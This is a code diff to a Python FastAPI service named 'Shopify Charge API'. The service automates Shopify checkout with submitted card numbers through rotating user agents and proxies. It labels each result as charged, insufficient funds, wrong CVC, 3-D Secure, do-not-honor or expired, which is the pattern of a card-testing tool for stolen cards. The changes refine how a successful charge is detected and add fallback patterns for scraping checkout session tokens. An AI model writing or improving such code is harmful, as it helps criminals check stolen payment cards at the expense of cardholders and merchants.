@@ -8,7 +8,7 @@ import asyncio
 import aiohttp
 from urllib.parse import urlparse
 
-app = FastAPI(title="Shopify Charge API", version="4.0.0")
+app = FastAPI(title="Shopify Charge API", version="5.0.0")
 
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36',
@@ -32,10 +32,7 @@ query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:Del
         ...on NegotiationResultAvailable{
           checkpointData
           queueToken
-          buyerProposal{
-            delivery{__typename}
-            payment{__typename}
-          }
+          buyerProposal{delivery{__typename} payment{__typename}}
           sellerProposal{
             delivery{
               ...on FilledDeliveryTerms{
@@ -128,13 +125,13 @@ def normalize_site(site: str) -> str:
 
 def classify(text: str) -> str:
     t = (text or "").lower()
-    if "payment_method_identifier" in t and "id" in t:
+    if "processedreceipt" in t:
         return "CHARGED"
     if "insufficient" in t:
         return "INSUFFICIENT"
     if "incorrect_cvc" in t or "invalid_cvc" in t:
         return "INCORRECT_CVC"
-    if "3d" in t or "actionrequired" in t or "completepaymentchallenge" in t:
+    if "completepaymentchallenge" in t or "3d" in t or "actionrequired" in t:
         return "3D_SECURE"
     if "do_not_honor" in t or "do not honor" in t:
         return "DO_NOT_HONOR"
@@ -142,12 +139,12 @@ def classify(text: str) -> str:
         return "EXPIRED_CARD"
     if "invalid" in t:
         return "INVALID_CARD"
-    if "processedreceipt" in t:
-        return "CHARGED"
     if "waitingreceipt" in t:
         return "PENDING"
     if "failedreceipt" in t:
         return "DECLINED"
+    if "receipt" in t:
+        return "CHARGED"
     if "declined" in t:
         return "DECLINED"
     if "approved" in t or "success" in t:
@@ -285,15 +282,34 @@ async def get_checkout_session(site_info: dict, proxy: Optional[str] = None):
             if "checkout" not in final_url:
                 return None, "Checkout Failed"
 
-            sst = re.search(r'serialized-session-token["\s:]+([^"&]+)', html)
-            queue = re.search(r'queueToken["\s:]+([^"&]+)', html)
+            # টোকেন এক্সট্রাকশন — ৩টি প্যাটার্ন
+            sst = None
+            queue_token = None
+
+            pat1 = re.search(r'serialized-session-token["\']?\s*[:=]\s*["\']?([^"&\s]+)', html)
+            if pat1:
+                sst = pat1.group(1)
+
+            if not sst:
+                pat2 = re.search(r'sessionToken["\']?\s*[:=]\s*["\']([^"&\s]+)', html)
+                if pat2:
+                    sst = pat2.group(1)
+
+            if not sst:
+                pat3 = re.search(r'([A-Za-z0-9_-]{30,})\s*[,;]', html)
+                if pat3:
+                    sst = pat3.group(1)
+
+            q1 = re.search(r'queueToken["\']?\s*[:=]\s*["\']?([^"&\s]+)', html)
+            if q1:
+                queue_token = q1.group(1)
 
             if not sst:
                 return None, "Session Token Not Found"
 
             return {
-                "sst": sst.group(1),
-                "queue_token": queue.group(1) if queue else None,
+                "sst": sst,
+                "queue_token": queue_token,
                 "checkout_url": final_url,
                 "attempt_token": final_url.split('/')[-1]
             }, None
@@ -352,10 +368,7 @@ async def run_charge(site_info: dict, session: dict, token: str, card: str, prox
             seller = neg.get("sellerProposal", {})
 
             payment_lines = seller.get("payment", {}).get("availablePaymentLines", [])
-            if payment_lines:
-                pmi = payment_lines[0].get("paymentMethod", {}).get("paymentMethodIdentifier")
-            else:
-                pmi = "card"
+            pmi = payment_lines[0].get("paymentMethod", {}).get("paymentMethodIdentifier") if payment_lines else "card"
 
             submit_vars = {
                 "input": {
@@ -423,7 +436,7 @@ async def run_charge(site_info: dict, session: dict, token: str, card: str, prox
 
 @app.get("/")
 async def root():
-    return {"status": "ok", "service": "Shopify Charge API"}
+    return {"status": "ok", "service": "Shopify Charge API v5"}
 
 @app.get("/health")
 async def health():
